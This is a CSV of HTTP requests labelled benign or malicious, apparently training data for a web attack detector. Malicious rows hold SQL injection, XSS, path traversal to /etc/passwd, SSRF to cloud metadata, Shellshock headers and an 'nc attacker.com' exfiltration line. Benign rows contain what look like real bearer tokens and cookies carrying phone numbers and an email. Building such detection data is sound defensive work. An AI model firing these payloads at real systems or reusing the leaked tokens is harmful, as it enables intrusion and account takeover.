method,path,query,headers,body,ua,label
GET,/api/orders/94ded3e2-f94f-4c6e-9790-86803d5ab095,,"Accept: */*; Accept-Encoding: gzip, deflate, br, zstd; Accept-Language: vi,vi-VN;q=0.9,en-US;q=0.8,en;q=0.7; Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJwaG9uZSI6IjA5NjI5NDM4NTciLCJzY2hhbm5lbCI6Ijk3MDQzNl8xIiwidXNlci1pZCI6ImJiODRmNmZhLWU3NmMtNDIzMi04YjFhLTM2NjIxNjk0ODViOCIsInN1YiI6Ijk3MDQzNl8xQDA5NjI5NDM4NTciLCJpYXQiOjE3NzA2MzAzNTcsImV4cCI6MTc3MDcxNjc1N30.oBRpTxVt40BC6tqAqePJg7uPhuPLsuQUurnD8VbV7UQ; Connection: keep-alive; Content-Type: application/json; Cookie: _gcl_au=1.1.1372566908.1770613603; _ga=GA1.1.1807987149.1770613603; _tt_enable_cookie=1; _ttp=01KH0CPZG6W4QQ05V6PJ6PBBB4_.tt.1; _fbp=fb.1.1770613604497.757535783882259638; ttcsid_CQQA2PJC77U11VCBE7G0=1770630359387::8zDiEgCPKbKyZOl4YBar.2.1770630384565.1; _ga_1XRVJ9DDS6=GS2.1.s1770630358$o2$g1$t1770630385$j33$l0$h0; ttcsid_CQNEHUJC77UD2I8MDM90=1770630359383::97ypdXmYuIbUiGd3Sm84.2.1770630395405.1; ttcsid=1770630359386::AZbOrh_Vja3Nrsa3cuRu.2.1770630395405.0; Host: vcbmb.vnshop.vn; Referer: https://vcbmb.vnshop.vn/profile/orders/94ded3e2-f94f-4c6e-9790-86803d5ab095; Sec-Ch-Ua: ""Not(A:Brand"";v=""8"", ""Chromium"";v=""144"", ""Android WebView"";v=""144""; Sec-Ch-Ua-Mobile: ?1; Sec-Ch-Ua-Platform: ""Android""; Sec-Fetch-Dest: empty; Sec-Fetch-Mode: cors; Sec-Fetch-Site: same-origin; User-Agent: Mozilla/5.0 (Linux; Android 15; 23021RAAEG Build/AQ3A.240829.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.132 Mobile Safari/537.36; X-Request-Id: 1074ba86-38d5-4da6-9485-ac03d8a96563; X-Requested-With: com.VCB",,"Mozilla/5.0 (Linux; Android 15; 23021RAAEG Build/AQ3A.240829.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.132 Mobile Safari/537.36",0
POST,/blog/article-1,,Host: example.com; Accept: */*,username=user643&password=pass939,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
DELETE,/search,q=phone,Host: example.com; Accept: */*,,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
POST,/test-framework-api/node/node/sys-task/053cb910-a251-4683-883e-4d42ae1389c8/next-message/1770690633,,"Accept-Encoding: gzip, x-gzip, deflate; Authorization: Bearer eyJraWQiOiJMbHFRYVBsYXRmb3JtIiwiYWxnIjoiUlMyNTYifQ.eyJpc3MiOiJMbHFRYVBsYXRmb3JtIiwianRpIjoiNDRlM2FkNDAtZjk3MS00ZTIyLWExNzEtN2ZjZjdmYjZjMjg4Iiwic3ViIjoibGluaG5kMkB2bnBheS52biIsImVtYWlsIjoibGluaG5kMkB2bnBheS52biIsInRva2VuVHlwZSI6Ik5PREUifQ.DtYHgQvhdbidHrh2NhfmxUwW4U4FwTA9gA2XmRtCXOFmF7ml_cA7wRFQCcOzYBVmJs-OJZ5zLAnDXeOboK81N42VpuWCZOSob4EEO41x-lKqXweGduTAAwsHm4ZhQ73ms4_a0xD6hL11hX55vxoSGyz1NY45yFcDBr18D-8k9dJTEMkuzlZG16WdP7xJ61CYg9XaekXAmiatkSEs8GjzT7lVGF7Ls87Nbi6FkkHt-tr2o77uiGqfKqxNTRyJovNGYqjKk6gN3MCc1o-Qo9e2FotfSxWp3Bz8rERYNoE-JborCLv6Fjj-pHC1Spzadj5wwWbV12_NnlSVYyaT-_lKQg; Cache-Control: no-cache; Connection: keep-alive; Content-Length: 0; Cookie: __Host-grv_app_session_subject=f0bb13ae464b39453391cb6dc0d4e1e62eeb8857b39548344a1b93a559d46740; __Host-grv_app_session=67a4d64fcf1b4d31f0af98d4b868ef5528a1bb9f44dfc6f98df7751a6d938386; Host: lqa.vnpaytest.vn; Node-Version: v1.0.0; User-Agent: Apache-HttpClient/5.4.1 (Java/17.0.4.1); X-Request-Id: 5899396a-6e9a-471d-9488-a42b2f3228d5",,Apache-HttpClient/5.4.1 (Java/17.0.4.1),0
GET,/settings/security,,Authorization: Bearer token123,,,0
POST,/api/v1/users,,Host: example.com; Accept: */*,input=http://127.0.0.1:8080/admin,Nikto/2.1.6,1
GET,/index.php,"q="" onmouseover=alert(1) """,Host: example.com; Accept: */*,,Nmap Scripting Engine,1
GET,/favicon.ico,,,,,0
GET,/favicon.ico,,,,,0
GET,/search,q=machine+learning,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",,,0
POST,/api/v1/users,,Host: example.com; Accept: */*,input=<script>alert(1)</script>,sqlmap/1.5.2,1
PUT,/search,,Host: example.com; Accept: */*,"input=' UNION SELECT NULL,NULL--",sqlmap/1.5.2,1
GET,/,<svg/onload=alert(1)>,Authorization: Bearer token123,,,1
GET,/admin/users,limit=20&offset=40,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,0
GET,/favicon.ico,,,,,0
GET,/search,q=machine+learning,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",,,0
GET,/blog/future-of-ai-2026,,Content-Type: application/json,,,0
GET,/components/com_rwcards/captcha/captcha_image.php,img=../../../../../../../../../etc/passwd%00,"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: atp.vnpay.vn; User-Agent: Mozilla/5.0 \(Windows NT 10.0\; Win64\; x64\) AppleWebKit/537.36 \(KHTML, like Gecko\) Chrome/100.0.4896.60 Safari/537.36",,"Mozilla/5.0 \(Windows NT 10.0\; Win64\; x64\) AppleWebKit/537.36 \(KHTML, like Gecko\) Chrome/100.0.4896.60 Safari/537.36",1
GET,/favicon.ico,,,,,0
POST,/login,,Content-Type: application/x-www-form-urlencoded,user=test&pass=test,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
DELETE,/checkout,,Host: example.com; Accept: */*,,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET,/,,Content-Type: application/json; Payload: %253cscript%253ealert(1)%253c/script%253e,,,1
GET,/search,q=laptop,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
DELETE,/index.php,,Host: example.com; Accept: */*,input=; ls -la,Nikto/2.1.6,1
PUT,/admin,,Host: example.com; Accept: */*,input=<img src=x onerror=alert(1)>,sqlmap/1.5.2,1
GET,/downloads/guide-v2.pdf,,Authorization: Bearer token123,,,0
GET,/,call=getRawDataFromDatabase&query=file:///etc/passwd,Content-Type: application/json,,,1
POST,/blog/article-1,,Host: example.com; Accept: */*,username=user38&password=pass325,Mozilla/5.0 (Linux; Android 11),0
PUT,/api/v1/profile,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",,,0
GET,/search,q=machine+learning+NOT+python,Content-Type: application/json,,,0
GET,/,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8; Payload: \x81\xfe\x00\x00... (illegal length)",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36; Payload: id=1 AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT password FROM users LIMIT 0,1), '.attacker.com\a')))",,,1
POST,/search,,Host: example.com; Accept: */*,input=<script>alert(1)</script>,Nikto/2.1.6,1
GET,/auth/verify-email,code=v987654321,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",,,0
PUT,/index.php,,Host: example.com; Accept: */*,"input="" onmouseover=alert(1) """,curl/7.68.0,1
GET,/wp-content/plugins/wp-planet/rss.class/scripts/magpie_debug.php,url=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E,"Accept-Encoding: gzip; Connection: close; Host: atp.vnpay.vn; User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15",1
DELETE,/login,,Host: example.com; Accept: */*,input=' OR 1=1--,curl/7.68.0,1
DELETE,/cart,,Host: example.com; Accept: */*,,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET,/,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8; Payload: <noscript><p title=""</noscript><img src=x onerror=alert(1)>"">",,,1
GET,/,,Content-Type: application/json; Payload: ; echo $USER | nc attacker.com 1234,,,1
POST,/team/invite,,Content-Type: application/json,,,0
POST,/cart,,Host: example.com; Accept: */*,username=user935&password=pass305,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
GET,/admin/users,limit=20&offset=40,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,0
POST,/cart,,Host: example.com; Accept: */*,username=user35&password=pass18,Mozilla/5.0 (Linux; Android 11),0
GET,/web-api/orders/b11d8c31-8d53-454d-9a89-1d92af017ad3,,"Accept: */*; Accept-Encoding: gzip, deflate, br; Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJwaG9uZSI6IjA3NzkyOTY1NzIiLCJzY2hhbm5lbCI6IldFQlNJVEUiLCJ1c2VyLWlkIjoiNzcxOWViY2EtOTlmZi00NDU5LWJmM2EtYzYyMDFhNzUzNGQ2IiwidXNlcm5hbWUiOiJXRUJTSVRFQDA3NzkyOTY1NzIiLCJzdWIiOiJXRUJTSVRFQDA3NzkyOTY1NzIiLCJpYXQiOjE3NzA2MzAyNzksImV4cCI6MTc3MTIzNTA3OX0.Pwn-Ze9HLrI1spoq8dhYb5lNYzir0fUizNYnQ4ZKJeg; Connection: keep-alive; Content-Type: application/json; Host: webapi-load.poc.vnshop.cloud; User-Agent: python-requests/2.32.5; X-Request-Id: 69c56c66-1bfb-4949-8c59-1b9f4106801b",,python-requests/2.32.5,0
DELETE,/search,,Host: example.com; Accept: */*,"input=' UNION SELECT NULL,NULL--",Nikto/2.1.6,1
GET,/,,"Authorization: Bearer token123; Payload: <iframe srcdoc=""<script>alert(1)</script>"">",,,1
POST,/profile,,Host: example.com; Accept: */*,username=user976&password=pass100,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
POST,/web-api/orders/260209PXBSCMMXE/paymentUrl,,"Accept: */*; Accept-Encoding: gzip, deflate, br; Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJwaG9uZSI6IjA3NzU1NDM1NTMiLCJzY2hhbm5lbCI6IldFQlNJVEUiLCJ1c2VyLWlkIjoiMTZjNGZmYzktNmQ5MS00ZjM3LTg4NTUtZTVhMzVkMmVkYTY5IiwidXNlcm5hbWUiOiJXRUJTSVRFQDA3NzU1NDM1NTMiLCJzdWIiOiJXRUJTSVRFQDA3NzU1NDM1NTMiLCJpYXQiOjE3NzA2MzAyMjMsImV4cCI6MTc3MTIzNTAyM30.atBMwugDNYeghp8eTrxMxyOdbhgQaqHMZymOQx1G904; Connection: keep-alive; Content-Length: 2; Content-Type: application/json; Host: webapi-load.poc.vnshop.cloud; User-Agent: python-requests/2.32.5; X-Request-Id: 7addc457-3ede-4b95-9194-7732f6bd33e3",,python-requests/2.32.5,0
GET,/search,q=laptop,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
POST,/user/password-update,,Content-Type: application/json,,,0
GET,/,,"Content-Type: application/json; Payload: <iframe src=""http://169.254.169.254/latest/meta-data/""></iframe>",,,1
POST,/,,Authorization: Bearer token123,"{""$type"": ""System.Windows.Data.ObjectDataProvider, ...""}",,1
GET,/download.php,file=../../../../../etc/passwd,Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0) Gecko/20100101 Firefox/141.0,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0) Gecko/20100101 Firefox/141.0,1
GET,/index.php,q=http://169.254.169.254/latest/meta-data,Host: example.com; Accept: */*,,Nikto/2.1.6,1
GET,/index.php,option=com_jcollection&controller=../../../../../../../etc/passwd%00,"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",,"Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",1
GET,/favicon.ico,,,,,0
POST,/api/v1/users,,Host: example.com; Accept: */*,username=user693&password=pass196,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
POST,/api/v1/users,,Host: example.com; Accept: */*,input=../../../../etc/passwd,Nmap Scripting Engine,1
GET,/favicon.ico,,,,,0
POST,/checkout,,Host: example.com; Accept: */*,username=user745&password=pass40,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
PUT,/api/v1/users,,Host: example.com; Accept: */*,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
POST,/cart,,Host: example.com; Accept: */*,username=user740&password=pass753,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET,/homess,,Content-Type: application/json,,,0
GET,/admin/,"page=reports&date=2022-05-27%27%20union%20select%201,2,3,md5('999999999'),5,6,7,8,9,10--+",Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0,1
POST,/search,,Host: example.com; Accept: */*,input=../../../../etc/passwd,Nmap Scripting Engine,1
POST,/api/v1/users,,Host: example.com; Accept: */*,input=| cat /etc/passwd,Nikto/2.1.6,1
GET,/document,__report=test.rptdesign&sample=%3C%25out.println%28%22DWBJILdwl22Ww5yRBSHl%22%29%3B%25%3E&__document=./test/xcVZv8SpU6o2Zin4NeBS.jsp/.,"Accept-Encoding: gzip; Connection: close; Host: atp.vnpay.vn; User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.46",,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.46",1
GET,/,,"Authorization: Bearer token123; Payload: id=1 UNION SELECT null, user(), database()--",,,1
GET,/,,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
PUT,/admin,,Host: example.com; Accept: */*,input=..\..\..\windows\system32,Nmap Scripting Engine,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36; Payload: %0d%0aBcc: victim@example.com",,,1
GET,/,,"Content-Type: application/json; Payload: id=1' AND 1=CONVERT(int, (SELECT password FROM users LIMIT 0,1))--",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36; Payload: ..\..\..\..\windows\system32\config\sam",,,1
DELETE,/index.php,,Host: example.com; Accept: */*,input=http://169.254.169.254/latest/meta-data,curl/7.68.0,1
DELETE,/index.php,,Host: example.com; Accept: */*,input=<img src=x onerror=alert(1)>,curl/7.68.0,1
GET,/,,"Authorization: Bearer token123; Payload: <foo xmlns:xi=""http://www.w3.org/2001/XInclude""><xi:include href=""file:///etc/passwd""/></foo>",,,1
GET,/index.php,option=com_dioneformwizard&controller=../../../../../../../../../../../../../etc/passwd%00,"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: atp.vnpay.vn; User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/604.2.4 (KHTML, like Gecko) Version/9.1.2 Safari/604.2.4",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/604.2.4 (KHTML, like Gecko) Version/9.1.2 Safari/604.2.4",1
PUT,/,,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
POST,/checkout,,Host: example.com; Accept: */*,username=user675&password=pass366,Mozilla/5.0 (Linux; Android 11),0
GET,/sysaid/getGfiUpgradeFile,fileName=../../../../../../../etc/passwd,"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: atp.vnpay.vn; User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36 Edg/84.0.522.69",,"Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36 Edg/84.0.522.69",1
DELETE,/login,,Host: example.com; Accept: */*,input=' OR 'x'='x,curl/7.68.0,1
GET,/search,q=machine+learning+NOT+python,Content-Type: application/json,,,0
GET,/if.cgi,redirect=setting.htm&failure=fail.htm&type=ap_tcps_apply&TF_ip=443&TF_submask=0&TF_submask=%22%3E%3Cscript%3Ealert%283A0GaVJMbaliD33aEzIO3CwtlWB%29%3C%2Fscript%3E&radio_ping_block=0&max_tcp=3&B_apply=APPLY,"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Authorization: Basic OmFkbWlu; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0 maglev/24004.1307.2669.7070/49",,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0 maglev/24004.1307.2669.7070/49",1
GET,/docs/api/introduction,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",,,0
GET,/products,sort=price_desc&page=1,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",,,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36; Payload: cos\nsystem\n(S'id'\ntR.",,,1
GET,/,,Authorization: Bearer token123; Payload: http://169.254.169.254/latest/meta-data/,,,1
POST,/,,Authorization: Bearer token123,"{""id"": {""$bitsAllSet"": [1, 5]}}",,1
PUT,/search,,Host: example.com; Accept: */*,input=' OR 1=1--,Nmap Scripting Engine,1
POST,/blog/article-1,,Host: example.com; Accept: */*,username=user81&password=pass925,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
PUT,/api/v1/profile,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",,,0
DELETE,/profile,,Host: example.com; Accept: */*,,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
DELETE,/admin,,Host: example.com; Accept: */*,input=..\..\..\windows\system32,Nikto/2.1.6,1
GET,/,,Authorization: Bearer token123; Payload: Transfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1,,,1
GET,/search,q=laptop,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,Content-Type: application/json; Payload: ; echo $USER | nc attacker.com 1234,,,1
GET,/api/v1/search/suggest,q=secur,Authorization: Bearer token123,,,0
GET,/static/css/style.css,,Authorization: Bearer token123,,,0
GET,/web-api/orders/3db18fc4-11cf-47f5-8e80-9870bea904d7,,"Accept: */*; Accept-Encoding: gzip, deflate, br; Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJwaG9uZSI6IjA3NzcxODI5NjkiLCJzY2hhbm5lbCI6IldFQlNJVEUiLCJ1c2VyLWlkIjoiYzQ5NGRlM2QtZjQwNC00OTA3LThhNTYtM2VkYTQyYWRmODE4IiwidXNlcm5hbWUiOiJXRUJTSVRFQDA3NzcxODI5NjkiLCJzdWIiOiJXRUJTSVRFQDA3NzcxODI5NjkiLCJpYXQiOjE3NzA2MzAxOTMsImV4cCI6MTc3MTIzNDk5M30.xBBSrKuC8jeEXlluY9cXItBjGipSt8bMB6jdzkP7B8s; Connection: keep-alive; Content-Type: application/json; Host: webapi-load.poc.vnshop.cloud; User-Agent: python-requests/2.32.5; X-Request-Id: 7b124c54-aaeb-4f46-b79b-b54bd6ec9902",,python-requests/2.32.5,0
POST,/,,Content-Type: application/json,"{""$where"": ""function() { return this.name == 'admin' }""}",,1
DELETE,/search,,Host: example.com; Accept: */*,input=| cat /etc/passwd,Nikto/2.1.6,1
POST,/profile,,Host: example.com; Accept: */*,username=user499&password=pass911,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
GET,/profile,,Host: example.com; Accept: */*,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/favicon.ico,,,,,0
POST,/graphql,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,0
POST,/register,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",,,0
GET,/images/hero-banner.webp,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",,,0
GET,/,id=1'/**/OR/**/'1'='1,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",,,1
GET,/,id=0x27204f52202731273d2731,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,1
GET,/search,q=1+1=2,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,0
POST,/profile,,Host: example.com; Accept: */*,username=user821&password=pass324,Mozilla/5.0 (Linux; Android 11),0
PUT,/api/v1/users,,Host: example.com; Accept: */*,input=admin'--,Nmap Scripting Engine,1
GET,/EZ-NET60/AlertMessages.aspx,Usertext=<img%20src%3Dx%20onerror%3Dalert(document.domain)>,Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:109.0) Gecko/20100101 Firefox/115.0,,Mozilla/5.0 (Windows NT 6.1; rv:109.0) Gecko/20100101 Firefox/115.0,1
POST,/user/ui/theme,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,0
GET,/favicon.ico,,Content-Type: application/json,,,0
POST,/api/v1/orders,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,0
GET,/,,Content-Type: application/json; Payload: || ls -la,,,1
GET,/titan-framework/lib/iframe-font-preview.php,font-type=google&font-family=aaaaa&font-weight=%27%20onerror=alert(document.domain)%20b=%27,Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0,1
GET,/,,Content-Type: application/json; Payload: ac ed 00 05 73 72 00 12 ...,,,1
DELETE,/admin,,Host: example.com; Accept: */*,input=| cat /etc/passwd,Nikto/2.1.6,1
GET,/,,"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Cookie: () { ignored; }; echo Content-Type: text/html; echo; /bin/cat /etc/passwd; Host: nagios.vnpay.vn; Referer: () { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd; Shellshock: () { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd; User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2 Safari/605.1.15",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2 Safari/605.1.15",1
GET,/search,q=laptop,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
POST,/login,,Host: example.com; Accept: */*,input=| cat /etc/passwd,sqlmap/1.5.2,1
POST,/,,Content-Type: application/json,{{constructor.constructor('alert(1)')()}},,1
GET,/stream/audio/segment_77.aac,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,0
POST,/login,,Content-Type: application/x-www-form-urlencoded,user=test&pass=test,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
DELETE,/profile,,Host: example.com; Accept: */*,,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
POST,/cart,,Host: example.com; Accept: */*,username=user665&password=pass154,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/admin/dashboard/users/active,,Content-Type: application/json,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36; Payload: http://127.0.0.1:22",,,1
GET,/ws/notifications,,Content-Type: application/json,,,0
POST,/blog/article-1,,Host: example.com; Accept: */*,username=user328&password=pass901,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/stream/audio/segment_77.aac,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,0
